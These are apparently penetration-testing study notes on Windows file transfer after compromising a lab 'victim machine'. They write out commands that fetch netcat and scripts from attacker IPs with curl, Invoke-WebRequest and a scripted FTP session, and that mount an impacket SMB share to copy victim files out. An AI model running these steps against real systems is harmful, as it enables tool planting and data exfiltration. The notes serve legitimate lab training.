---
description: >-
  Windows File Transfer various techniques
title: Windows File Transfer              # Add title here
date: 2023-01-29 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, Windows - File Transfer]                     # Change Templates to Writeup
tags: [file transfer, windows upload, windows download]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Upload

Netcat execution for windows.
From victim machine:
```powershell
curl http://10.10.16.4/nc.exe -o nc.exe
```
Examples:
[[StreamIO#^40a776]]

### Network File System through SMB
First create with impacket the server locally on attacker machine:
```bash
impacket-smbserver shareFolder $(pwd) -smb2support
```
Then you can access directly to this folder from the file explorer itself, by putting the address on the search bar:
```bash
\\192.168.119.186\shareFolder
```
![Description](/assets/img/Pasted-image-20220907003801.png)
If by any chance we get the following error:
![Description](/assets/img/Pasted-image-20230129045937.png)
We need to create a share with authentication to mount our share in the victim machine as another NFS:
```bash
impacket-smbserver shareFolder $(pwd) -smb2support -username shuciran -password shuciran123
```
Next, to mount it on a NFS on the victim machine we execute the following command:
```bash
net use x: \\10.10.14.4\shareFolder /user:shuciran shuciran123
```
Then we can check if the x:\ NFS is mounted:
```bash
dir x:\
```

### Powershell
```powershell
powershell Invoke-WebRequest -Uri http://10.10.119.207/GetCLSID.ps1 -Outfile GetCLSID.ps1
```

# Download

### SMB
To download files from the victim machine all you need to do is to copy within the SMB Shared Folder:
```powershell
copy <file> \\192.168.119.186\shareFolder
```

### Non-Interactive FTP Download
For installation and setup on attack machine please refer to [[FTP Server]]
First, we will place a file in our /ftphome directory:
```bash
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
```
We have already installed and configured Pure-FTPd on our Kali machine, but we will restart it to make sure the service is available:
```bash
kali@kali:~$ sudo systemctl restart pure-ftpd
```
Next execute following command:
```powershell
echo open 192.168.243.142 21> ftp.txt && echo USER offsec>> ftp.txt && echo password>> ftp.txt && echo bin >> ftp.txt && echo GET nc.exe >> ftp.txt && echo bye >> ftp.txt
```
Initiate FTP with commands on it:
```bash
C:\Users\offsec> ftp -v -n -s:ftp.txt
```
When the ftp command runs, our download should have executed, and a working copy of nc.exe should appear in our current directory:
```bash
C:\Users\offsec> ftp -v -n -s:ftp.txt
open 192.168.1.31 21
USER offsec
bin
GET nc.exe
bye
```



